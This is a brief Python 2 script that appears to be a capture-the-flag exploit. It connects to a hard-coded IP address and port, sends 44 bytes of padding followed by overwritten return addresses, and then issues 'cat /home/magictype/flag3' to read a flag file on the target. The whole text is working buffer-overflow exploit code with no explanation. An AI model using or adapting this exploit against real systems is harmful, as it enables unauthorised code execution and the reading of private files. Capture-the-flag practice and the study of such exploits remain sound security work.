import socket
import sys

x = 0
while x<3:
        try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        except socket.error,msg:
                sys.exit();
        print 'Success to create socket'
        host = '140.113.194.85'
        port = 49169
        s.connect((host,port))
        data = s.recv(1024)
        s.send('1\r\n')
        try:
                i=0
                while i < 44:
                        s.send('a')
                        i+=1
                if x == 0:
                        s.send('\xed\x88\x04\x08\r\n')
                        print s.recv(1024)
                elif x == 1:
                        s.send('\xcd\x88\x04\x08\r\n')
                        print s.recv(1024)
                else:
                        s.send('\xf0\x86\x04\x08----\xa0\xb0\x04\x08\r\n')
                        print s.recv(1024)
                        #s.send('ls\n')
                        s.send('cat /home/magictype/flag3\n')
                        print s.recv(1024)
                data = s.recv(1024)
                print data
                print s.recv(1024)+s.recv(1024)
        except:
                s.close()
        x+=1
